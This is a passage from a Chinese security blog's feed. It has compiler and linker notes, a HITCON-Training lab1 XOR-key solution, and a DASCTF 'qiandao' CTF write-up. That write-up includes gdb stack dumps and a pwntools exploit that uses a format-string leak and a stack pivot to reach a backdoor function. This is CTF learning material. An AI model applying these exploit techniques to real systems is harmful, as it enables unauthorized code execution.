class="comment">#产生目标文件</span></span><br></pre></td></tr></table></figure><p><strong>从汇编代码到机器指令</strong></p><h3 id="第四步-链接"><a href="#第四步-链接" class="headerlink" title="第四步 | 链接"></a>第四步 | 链接</h3><p><strong>简单来说：链接器是将很多的目标文件（.o）链接起来</strong></p><h2 id="编译-了解一下"><a href="#编译-了解一下" class="headerlink" title="编译  | 了解一下"></a>编译  | 了解一下</h2><pre><code>array[index]=（index+4）*(2+6);</code></pre><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p><strong>扫描器扫描分割，比如array是标识符，[是左括号等等，C语言的宏展开交给独立的预处理器。</strong></p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p><strong>语法分析器已表达式为节点，构建语法分析树。</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194407.jpg" alt=""></p><h4 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h4><p><strong>静态语义分析：声明，类型匹配，类型转换</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194418.jpg" alt=""></p><h4 id="源码优化-amp-目标代码生成及优化"><a href="#源码优化-amp-目标代码生成及优化" class="headerlink" title="源码优化&amp;目标代码生成及优化"></a>源码优化&amp;目标代码生成及优化</h4><p><strong>源码优化：比如2+6被优化成8，目标代码生成及优化：删除多余指令，是有合适的寻址方式等等。</strong></p><h2 id="链接-略懂略懂"><a href="#链接-略懂略懂" class="headerlink" title="链接 | 略懂略懂"></a>链接 | 略懂略懂</h2><h4 id="历史久远-从纸带说起"><a href="#历史久远-从纸带说起" class="headerlink" title="历史久远 | 从纸带说起"></a>历史久远 | 从纸带说起</h4><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194427.jpg" alt=""></p><p><strong>上图就是纸带，左侧是行号，试想要是插入指令在某一行，对应的在其中的目标地址就要全部重新算，这个过程即是重定位，由于地址是数字，变化会很复杂，所以才去地址符号化策略，譬如’foo’，无论实际地址如何变化，在编译时会重新计算’foo’地址，将引用到’foo’的指令修正到正确地址；</strong></p><h4 id="静态链接-模块拼装"><a href="#静态链接-模块拼装" class="headerlink" title="静态链接 | 模块拼装"></a>静态链接 | 模块拼装</h4><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194435.jpg" alt=""></p><h4 id="重定位-地址"><a href="#重定位-地址" class="headerlink" title="重定位 | 地址"></a>重定位 | 地址</h4><p><strong>比如a模块用b模块的var变量，var=0x1,编译a时，var的地址为0x00 00 00 00（因为不知道实际地址），之后链接器会讲正确地址覆盖0x00 00 00 00,每个修正的地方叫重定位入口。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;编译与链接&quot;&gt;&lt;a href=&quot;#编译与链接&quot; class=&quot;headerlink&quot; title=&quot;编译与链接&quot;&gt;&lt;/a&gt;编译与链接&lt;/h2&gt;&lt;h3&gt;被隐藏的过程&lt;/h3&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hitcon-Training</title>
    <link href="https://chenyu3050.github.io/2020/11/23/Hitcon-Training/"/>
    <id>https://chenyu3050.github.io/2020/11/23/Hitcon-Training/</id>
    <published>2020-11-23T02:05:27.420Z</published>
    <updated>2020-07-28T04:16:34.207Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Hitcon-training"><a href="#Hitcon-training" class="headerlink" title="Hitcon-training"></a>Hitcon-training</h2><pre><code>git clone https://github.com/scwuaptx/HITCON-Training.git</code></pre><p><strong>已有环境，git克隆到当前目录</strong></p><h2 id="HITCON"><a href="#HITCON" class="headerlink" title="HITCON"></a>HITCON</h2><h3 id="lab1-多种解法"><a href="#lab1-多种解法" class="headerlink" title="lab1 | 多种解法"></a>lab1 | 多种解法</h3><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200728100332.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194343.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194348.png" alt=""></p><p><strong>buf=v2，则异或打印flag，但是buf无法被v2覆盖，所以无法从输入端控制，但是异或的v54的用char显示，根据小端模式，推知Do_y，即输入（0x44 6F5F79）=&gt;0x795f6f44(内存中/栈中)=&gt;(y_oD),所以用python复原字符串</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list=[<span class="number">0x795f6f44</span>,<span class="number">0x6B5F756F</span>,<span class="number">0x5F776F6E</span>,<span class="number">0x5F796877</span>,<span class="number">0x745F796D</span>,<span class="number">0x6D6D6165</span>,<span class="number">0x5F657461</span>,<span class="number">0x6E61724F</span>, <span class="number">0x695F6567</span>,<span class="number">0x6F735F73</span>,<span class="number">0x676E615F</span>,<span class="number">0x3F3F7972</span>] <span class="comment">#0x3f</span></span><br><span class="line">str=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">str+=chr(i%<span class="number">0x100</span>)</span><br><span class="line">str+=chr(int(i%<span class="number">0x10000</span>/<span class="number">0x100</span>))</span><br><span class="line">str+=chr(int(i%<span class="number">0x1000000</span>/<span class="number">0x10000</span>))</span><br><span class="line">str+=chr(int((i%<span class="number">0x100000000</span>/<span class="number">0x1000000</span>)))</span><br><span class="line">str+=chr(<span class="number">0x3f</span>)</span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure><p><strong>以上是python对字符串的复原，复原即下方的key</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> key[] = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span>;</span><br><span class="line"><span class="keyword">char</span> cipher[] = &#123;<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">sizeof</span>(cipher) ; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,cipher[i]^key[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727195914.png" alt=""></p><p><strong>还可以gdb调试</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727193717.jpg" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200728101628.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;Hitcon-training&quot;&gt;&lt;a href=&quot;#Hitcon-training&quot; class=&quot;headerlink&quot; title=&quot;Hitcon-training&quot;&gt;&lt;/a&gt;Hitcon-training&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;git c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF | 七月pwn复现</title>
    <link href="https://chenyu3050.github.io/2020/11/23/DASCTF%207%E6%9C%88/"/>
    <id>https://chenyu3050.github.io/2020/11/23/DASCTF%207%E6%9C%88/</id>
    <published>2020-11-23T02:05:27.408Z</published>
    <updated>2020-08-03T10:36:50.963Z</updated>
    
    <content type="html"><![CDATA[<h3 id="qiandao-格式化字符串-栈溢出"><a href="#qiandao-格式化字符串-栈溢出" class="headerlink" title="qiandao | 格式化字符串+栈溢出"></a>qiandao | 格式化字符串+栈溢出</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chen@ubuntu:~/Desktop$ checksec qiandao</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/chen/Desktop/qiandao'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="1.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gets(&amp;s);</span><br><span class="line"><span class="built_in">printf</span>(&amp;s);<span class="comment">//格式化字符串漏洞，泄露栈上的信息</span></span><br><span class="line">...</span><br><span class="line">gets(&amp;v4);<span class="comment">//no canary 所以存在栈溢出</span></span><br></pre></td></tr></table></figure><p><strong>在main函数结尾发现已下的汇编代码，对汇编代码的分析很关键</strong></p><p><img src= "/img/loading.gif" data-src="2.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="3.jpg" alt=""></p><ul><li>这段汇编决定了直接栈溢出无效，关键就在于esp被改变</li><li>mov     ecx, [ebp+var_4],ecx=(ebp-0x4)地址中的内容赋值</li><li>lea esp,[ecx-4]可以认为是mov esp,ecx-0x4即esp=ecx-0x4，esp指针被控制则会影响ret</li></ul><strong>采用gdb-peda辅助分析</strong><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECX: 0xf7fb75a0 --&gt; 0xfbad208b    &#x2F;&#x2F;执行mov     ecx, [ebp+var_4]之前</span><br><span class="line">EDX: 0xf7fb887c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffd068 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">..........</span><br><span class="line">ECX: 0xffffd080 --&gt; 0x1     &#x2F;&#x2F;执行mov     ecx, [ebp+var_4]之后 </span><br><span class="line">EDX: 0xf7fb887c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffd068 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">...........</span><br><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">0004| 0xffffd044 --&gt; 0x0 </span><br><span class="line">0008| 0xffffd048 --&gt; 0xf7e35840 (add    ebx,0x1817c0)</span><br><span class="line">0012| 0xffffd04c --&gt; 0x804865b (&lt;__libc_csu_init+75&gt;:add    edi,0x1)</span><br><span class="line">0016| 0xffffd050 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">0020| 0xffffd054 --&gt; 0xffffd114 --&gt; 0xffffd2e9 (&quot;&#x2F;home&#x2F;chen&#x2F;Desktop&#x2F;qiandao&quot;)</span><br><span class="line">0024| 0xffffd058 --&gt; 0xffffd11c --&gt; 0xffffd304 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0028| 0xffffd05c --&gt; 0x8048631 (&lt;__libc_csu_init+33&gt;:lea    eax,[ebx-0xf8])</span><br><span class="line">0032| 0xffffd060 --&gt; 0xf7fb73dc --&gt; 0xf7fb81e0 --&gt; 0x0 </span><br><span class="line">0036| 0xffffd064 --&gt; 0xffffd080 --&gt; 0x1 &#x2F;&#x2F;EBP-4 ，ecx&#x3D;(ebp-0x4)地址中的内容赋值</span><br><span class="line">0040| 0xffffd068 --&gt; 0x0    &#x2F;&#x2F;EBP</span><br><span class="line">0044| 0xffffd06c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0048| 0xffffd070 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0052| 0xffffd074 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0056| 0xffffd078 --&gt; 0x0 </span><br><span class="line">0060| 0xffffd07c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0064| 0xffffd080 --&gt; 0x1    &#x2F;&#x2F;ECX</span><br></pre></td></tr></table></figure><strong>接下来 leave,则mov esp,ebp=>esp=ebp=0xffffd068,pop ebp之后esp=0xffffd06c,之后esp=ecx-0x4= [ebp+var_4]-0x4(此处ebp=0xffffd068)，转化一下就是esp= [0xffffd064]-0x4,esp=var_4（在栈上可以覆盖）的内容-0x4，</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./qiandao</span><br><span class="line">disas main</span><br><span class="line">b * 0x080485d1</span><br></pre></td></tr></table></figure><strong>在printf(&s);处下断点，便于观察输入在栈上的位置</strong><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0xffffd030 --&gt; 0xffffd050 (&quot;%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffffd034 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 &#x2F;&#x2F;第一个%p&#x3D;&gt;0xf7fb7000</span><br><span class="line">0008| 0xffffd038 --&gt; 0xffffd068 --&gt; 0x0   &#x2F;&#x2F;第二个%p&#x3D;&gt;0xffffd068&#x3D;ebp&#x3D;&gt;%2$p</span><br><span class="line">0012| 0xffffd03c --&gt; 0x80485ab (&lt;main+22&gt;:sub    esp,0xc)</span><br><span class="line">0016| 0xffffd040 --&gt; 0x1   &#x2F;&#x2F;ebp-0x28 gets(&amp;s)第二次输入点[0xffffd064]-0x4</span><br><span class="line">0020| 0xffffd044 --&gt; 0x0  &#x2F;&#x2F;ebp-0x24  [0xffffd06c]&#x3D; 0xffffd044&#x3D;&gt;                       </span><br><span class="line">0024| 0xffffd048 --&gt; 0xf7e35840 (add    ebx,0x1817c0)</span><br><span class="line">0028| 0xffffd04c --&gt; 0x804865b (&lt;__libc_csu_init+75&gt;:add    edi,0x1)</span><br><span class="line">0032| 0xffffd050 (&quot;%p%p%p%p%p%p&quot;)</span><br><span class="line">0036| 0xffffd054 (&quot;%p%p%p%p&quot;)</span><br><span class="line">0040| 0xffffd058 (&quot;%p%p&quot;)</span><br><span class="line">0044| 0xffffd05c --&gt; 0x8048600 (&lt;main+107&gt;:leave)</span><br><span class="line">0048| 0xffffd060 --&gt; 0xf7fb73dc --&gt; 0xf7fb81e0 --&gt; 0x0 </span><br><span class="line">0052| 0xffffd064 --&gt; 0xffffd080 --&gt; 0x1 </span><br><span class="line">0056| 0xffffd068 --&gt; 0x0 </span><br><span class="line">0060| 0xffffd06c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0064| 0xffffd070 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0068| 0xffffd074 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0072| 0xffffd078 --&gt; 0x0 </span><br><span class="line">0076| 0xffffd07c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0080| 0xffffd080 --&gt; 0x1 </span><br><span class="line">0084| 0xffffd084 --&gt; 0xffffd114 --&gt; 0xffffd2e9 (&quot;&#x2F;home&#x2F;chen&#x2F;Desktop&#x2F;qiandao&quot;)</span><br><span class="line">0088| 0xffffd088 --&gt; 0xffffd11c --&gt; 0xffffd304 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0092| 0xffffd08c --&gt; 0x0 </span><br><span class="line">0096| 0xffffd090 --&gt; 0x0 </span><br><span class="line">0100| 0xffffd094 --&gt; 0x0 </span><br><span class="line">0104| 0xffffd098 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0108| 0xffffd09c --&gt; 0xf7ffdc04 --&gt; 0x0 </span><br><span class="line">0112| 0xffffd0a0 --&gt; 0xf7ffd000 --&gt; 0x23f40 </span><br><span class="line">0116| 0xffffd0a4 --&gt; 0x0</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10019</span>)</span><br><span class="line">p=process(<span class="string">'./qiandao'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">p.recvuntil(<span class="string">"what's your name:\n"</span>)<span class="comment"># this is an error \n</span></span><br><span class="line"><span class="comment">#payload=0x24*'a'+p32(ebp)+'bbbb'+p32(0x804857d)</span></span><br><span class="line">p.sendline(<span class="string">"%2$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr=int(p.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(addr))</span><br><span class="line">back_door=<span class="number">0x804857d</span></span><br><span class="line">payload=p32(back_door)+<span class="string">'a'</span>*<span class="number">0x20</span>+p32(addr<span class="number">-0x24</span>)<span class="comment"># use addr var_4 to get backdoor on the stack </span></span><br><span class="line">p.recvuntil(<span class="string">"Can you solve this sign-in problem?\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>本地</strong></p><p><img src= "/img/loading.gif" data-src="4.jpg" alt=""></p><p><strong>远程：提交flag还要去掉flag{},呵呵</strong></p><p><img src= "/img/loading.gif" data-src="5.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;qiandao-格式化字符串-栈溢出&quot;&gt;&lt;a href=&quot;#qiandao-格式化字符串-栈溢出&quot; class=&quot;headerlink&quot; title=&quot;qiandao | 格式化字符串+栈溢出&quot;&gt;&lt;/a&gt;qiandao | 格式化字符串+栈溢出&lt;/h3&gt;&lt;figu
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
